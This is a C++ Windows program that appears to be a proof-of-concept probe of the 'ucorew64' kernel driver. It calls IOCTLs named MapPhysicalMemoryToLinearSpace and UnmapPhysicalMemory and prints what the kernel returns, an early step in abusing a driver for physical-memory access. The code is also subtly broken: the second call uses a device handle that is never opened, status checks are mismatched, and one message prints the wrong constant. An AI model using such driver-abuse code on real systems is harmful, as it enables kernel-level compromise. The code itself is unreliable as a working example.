#include <iostream>
#include <Windows.h>
//#include <ntstatus.h>

#define MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define UnmapPhysicalMemory 0xFA002EEC
#define STATUS_SUCCESS 0x0

struct struct_buffer
{
    void* SectionHandle;
    DWORD offset;
    unsigned int BusAddress;
    PVOID PhysicalBaseAddress;
};


int main(char argc, char** argv)
{
    HANDLE device = INVALID_HANDLE_VALUE;
    NTSTATUS status = FALSE;
    DWORD bytesReturned = 0;
    char inBuffer[64] = {0};
    CHAR outBuffer[64] = { 0 };

    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("> Could not open device: 0x%X\n", GetLastError());
        return FALSE;
    }

    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
    if (status == FALSE) {
        printf("[!] MapPhysicalMemoryToLinearSpace failed with %X\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);
    /*
    printf("[*] inBuffer PhysicalBaseAddress: %p\n", inBuffer.PhysicalBaseAddress);
    printf("[*] inBuffer SectionHandle: %p\n", inBuffer.SectionHandle);
    */


    system("pause");

    HANDLE device2 = INVALID_HANDLE_VALUE;
    NTSTATUS status2 = FALSE;
    DWORD bytesReturned2 = 0;
    CHAR inBuffer2[64] = { 0 };
    CHAR outBuffer2[64] = { 0 };

    printf("[ ] Calling UnmapPhysicalMemory 0x%X\n", UnmapPhysicalMemory);
    status = DeviceIoControl(device2, UnmapPhysicalMemory, inBuffer2, sizeof(inBuffer2), outBuffer2, sizeof(outBuffer2), &bytesReturned2, (LPOVERLAPPED)NULL);
    if (status != STATUS_SUCCESS) {
        printf("[!] UnmapPhysicalMemory failed with %X\n", status);
    }
    printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer2[0], bytesReturned2);

    system("pause");

    CloseHandle(device);
    return EXIT_SUCCESS;
}